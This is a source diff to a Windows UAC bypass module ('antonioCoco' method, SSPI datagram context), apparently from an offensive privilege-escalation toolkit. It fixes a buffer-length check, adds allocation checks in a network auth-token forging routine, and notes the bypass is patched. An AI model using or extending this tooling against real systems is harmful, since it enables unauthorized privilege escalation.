@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2023
+*  (C) COPYRIGHT AUTHORS, 2023 - 2025
 *
 *  TITLE:       ANTONIOCOCO.C
 *
-*  VERSION:     3.65
+*  VERSION:     3.69
 *
-*  DATE:        01 Oct 2023
+*  DATE:        07 Jul 2025
 *
 *  UAC bypass method from antonioCoco.
 *
@@ -482,6 +482,7 @@ BOOL ucmxRpcAppendRequestData_Binary(
 {
     DWORD dwBytesAvailable = 0;
     DWORD dwDataLength = DataLength;
+    DWORD dwPadding = 0;
 
     if (IsUnicode)
         dwDataLength *= sizeof(WCHAR);
@@ -492,11 +493,13 @@ BOOL ucmxRpcAppendRequestData_Binary(
     if (RpcConnection->dwRequestInitialized == 0)
         return FALSE;
 
+    dwPadding = CALC_ALIGN_PADDING(dwDataLength, sizeof(ULONG));
+
     //
     // Calculate number of bytes remaining in the input buffer.
     //
     dwBytesAvailable = sizeof(RpcConnection->bProcedureInputData) - RpcConnection->dwProcedureInputDataLength;
-    if (dwDataLength > dwBytesAvailable)
+    if ((dwDataLength + dwPadding) > dwBytesAvailable)
     {
         //
         // Set input error flag.
@@ -510,7 +513,7 @@ BOOL ucmxRpcAppendRequestData_Binary(
     //
     RtlCopyMemory(&RpcConnection->bProcedureInputData[RpcConnection->dwProcedureInputDataLength], Data, dwDataLength);
     RpcConnection->dwProcedureInputDataLength += dwDataLength;
-    RpcConnection->dwProcedureInputDataLength += CALC_ALIGN_PADDING(dwDataLength, sizeof(ULONG));
+    RpcConnection->dwProcedureInputDataLength += dwPadding;
 
     return TRUE;
 }
@@ -715,6 +718,10 @@ SECURITY_STATUS ucmxForgeNetworkAuthToken(
         negotiateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
         negotiateBuffer.BufferType = SECBUFFER_TOKEN;
         negotiateBuffer.pvBuffer = supHeapAlloc(MAX_MESSAGE_SIZE);
+        if (negotiateBuffer.pvBuffer == NULL) {
+            secStatus = SEC_E_INSUFFICIENT_MEMORY;
+            break;
+        }
 
         secStatus = InitializeSecurityContext(&hCredClient,
             NULL,
@@ -738,6 +745,10 @@ SECURITY_STATUS ucmxForgeNetworkAuthToken(
         challengeBuffer.cbBuffer = MAX_MESSAGE_SIZE;
         challengeBuffer.BufferType = SECBUFFER_TOKEN;
         challengeBuffer.pvBuffer = supHeapAlloc(MAX_MESSAGE_SIZE);
+        if (challengeBuffer.pvBuffer == NULL) {
+            secStatus = SEC_E_INSUFFICIENT_MEMORY;
+            break;
+        }
 
         secStatus = AcceptSecurityContext(&hCredServer,
             NULL,
@@ -758,6 +769,10 @@ SECURITY_STATUS ucmxForgeNetworkAuthToken(
         authenticateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
         authenticateBuffer.BufferType = SECBUFFER_TOKEN;
         authenticateBuffer.pvBuffer = supHeapAlloc(MAX_MESSAGE_SIZE);
+        if (authenticateBuffer.pvBuffer == NULL) {
+            secStatus = SEC_E_INSUFFICIENT_MEMORY;
+            break;
+        }
 
         secStatus = InitializeSecurityContext(NULL,
             &clientContextHandle,
@@ -815,6 +830,8 @@ SECURITY_STATUS ucmxForgeNetworkAuthToken(
 * Purpose:
 *
 * Bypass UAC using SSPI datagram context.
+* 
+* Fixed by MS ninja patch (including old Win10 releases).
 *
 */
 NTSTATUS ucmSspiDatagramMethod(
